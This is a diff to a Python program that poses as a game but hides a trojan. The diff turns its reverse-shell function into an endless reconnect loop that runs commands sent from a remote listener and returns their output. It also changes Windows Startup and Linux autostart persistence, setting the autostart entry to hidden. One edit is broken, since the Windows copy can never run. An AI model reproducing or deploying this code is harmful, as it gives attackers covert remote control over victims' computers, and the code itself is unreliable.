@@ -72,57 +72,58 @@ def notify_user(listener_ip):
         sys.exit(0)
 
 def provide_shell_access_with_netcat(listener_ip, listener_port):
-    """Provide shell access using Netcat by executing commands from the listener."""
-    system = platform.system()
-    log_entry = f"[{time.ctime()}] Providing shell access using Netcat on {system}:\n"
-    with open(LOG_FILE, "a") as log:
-        log.write(log_entry)
-    print(f"Starting Netcat shell access to {listener_ip}:{listener_port}...")
-
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect((listener_ip, listener_port))
-            log_entry = f"[{time.ctime()}] Connected to Netcat listener at {listener_ip}:{listener_port}\n"
-            with open(LOG_FILE, "a") as log:
-                log.write(log_entry)
-            print(f"Connected to Netcat listener at {listener_ip}:{listener_port}")
-
-            while True:
-                command = s.recv(1024).decode().strip()
-                if not command:
-                    break 
-                if command.lower() == "exit":
-                    break  
-
-                log_entry = f"[{time.ctime()}] Received command: {command}\n"
-                with open(LOG_FILE, "a") as log:
-                    log.write(log_entry)
-
-                try:
-                    if system == "Windows":
-                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-                    else:  
-                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-                except subprocess.CalledProcessError as e:
-                    output = f"Error executing command: {e.output}"
-                except Exception as e:
-                    output = f"Error: {str(e)}"
-
-                log_entry = f"[{time.ctime()}] Command output: {output}\n"
-                with open(LOG_FILE, "a") as log:
-                    log.write(log_entry)
-
-                s.sendall(output.encode())
-
-    except ConnectionRefusedError:
-        print(f"Warning: Could not connect to Netcat listener at {listener_ip}:{listener_port}. Ensure the listener is running.")
-    except Exception as e:
-        print(f"Error during Netcat shell access: {e}")
-    finally:
-        log_entry = f"[{time.ctime()}] Netcat shell access terminated\n"
+    while True:
+        """Provide shell access using Netcat by executing commands from the listener."""
+        system = platform.system()
+        log_entry = f"[{time.ctime()}] Providing shell access using Netcat on {system}:\n"
         with open(LOG_FILE, "a") as log:
             log.write(log_entry)
-        print("Netcat shell access terminated.")
+        print(f"Starting Netcat shell access to {listener_ip}:{listener_port}...")
+
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((listener_ip, listener_port))
+                log_entry = f"[{time.ctime()}] Connected to Netcat listener at {listener_ip}:{listener_port}\n"
+                with open(LOG_FILE, "a") as log:
+                    log.write(log_entry)
+                print(f"Connected to Netcat listener at {listener_ip}:{listener_port}")
+
+                while True:
+                    command = s.recv(1024).decode().strip()
+                    if not command:
+                        break 
+                    if command.lower() == "exit":
+                        break  
+
+                    log_entry = f"[{time.ctime()}] Received command: {command}\n"
+                    with open(LOG_FILE, "a") as log:
+                        log.write(log_entry)
+
+                    try:
+                        if system == "Windows":
+                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                        else:  
+                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                    except subprocess.CalledProcessError as e:
+                        output = f"Error executing command: {e.output}"
+                    except Exception as e:
+                        output = f"Error: {str(e)}"
+
+                    log_entry = f"[{time.ctime()}] Command output: {output}\n"
+                    with open(LOG_FILE, "a") as log:
+                        log.write(log_entry)
+
+                    s.sendall(output.encode())
+
+        except ConnectionRefusedError:
+            print(f"Warning: Could not connect to Netcat listener at {listener_ip}:{listener_port}. Ensure the listener is running.")
+        except Exception as e:
+            print(f"Error during Netcat shell access: {e}")
+        finally:
+            log_entry = f"[{time.ctime()}] Netcat shell access terminated\n"
+            with open(LOG_FILE, "a") as log:
+                log.write(log_entry)
+            print("Netcat shell access terminated.")
 
 def add_persistence():
     """Simulate persistence by adding the game to startup."""
@@ -133,7 +134,8 @@ def add_persistence():
         startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
         script_path = os.path.abspath(__file__)
         dest_path = os.path.join(startup_path, f"{GAME_NAME}.py")
-        shutil.copy(script_path, dest_path)
+        if not dest_path:
+            shutil.copy(script_path, dest_path)
         print(f"Persistence added to Windows Startup: {dest_path}")
     elif system == "Linux":
         autostart_path = f"/home/{username}/.config/autostart/"
@@ -143,7 +145,7 @@ def add_persistence():
 Type=Application
 Name={GAME_NAME}
 Exec={sys.executable} {os.path.abspath(__file__)}
-Hidden=false
+Hidden=true
 NoDisplay=true
 X-GNOME-Autostart-enabled=true
 """
@@ -266,7 +268,8 @@ def main():
     netcat_thread = threading.Thread(target=provide_shell_access_with_netcat, args=(listener_ip, NETCAT_LISTENER_PORT))
     netcat_thread.start()
     play_game()
-    netcat_thread.join()
+    while True:
+        netcat_thread.join()
 
 if __name__ == "__main__":
     main()
